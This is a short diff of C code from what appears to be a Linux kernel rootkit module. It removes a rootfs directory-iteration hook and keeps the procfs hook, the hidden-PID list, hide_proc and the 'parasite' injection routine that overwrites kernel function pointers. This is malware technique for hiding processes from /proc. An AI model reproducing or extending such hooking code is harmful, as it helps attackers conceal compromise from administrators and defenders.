@@ -86,11 +86,9 @@ struct hidden_pids
 
 
 static int filesystem_procfs_hook_iterate(struct file *,struct dir_context *);
-static int filesystem_rootfs_hook_iterate(struct file *,struct dir_context *);
 
 
 static int procfs_filldir(void *,const char *,int,loff_t,u64,unsigned int);
-static int rootfs_filldir(void *,const char *,int,loff_t,u64,unsigned int);
 
 
 static int 	procfs_entry_init(void);
@@ -108,10 +106,8 @@ static void unhook_func(void);
 static void hide_proc(void);
 
 static int (*struct_procfs_iterate)(struct file *fp,struct dir_context *ctx);
-static int (*struct_rootfs_iterate)(struct file *fp,struct dir_context *ctx);
 
 static filldir_t struct_procfs_filldir;
-static filldir_t struct_rootfs_filldir;
 
 LIST_HEAD(hidden_pids_listhead);
 
@@ -402,7 +398,6 @@ static void unhook_func()
 	struct hooked_function *current_hooked,*next_hooked;
 	//uninstalls all parasites; restores original pointers
 	inject_parasite(struct_procfs_iterate,REMOVE_PARASITE);
-	inject_parasite(struct_rootfs_iterate,REMOVE_PARASITE);
 
 	list_for_each_entry_safe(current_hooked,next_hooked,&hooked_functions_listhead,hook_list)
 	{
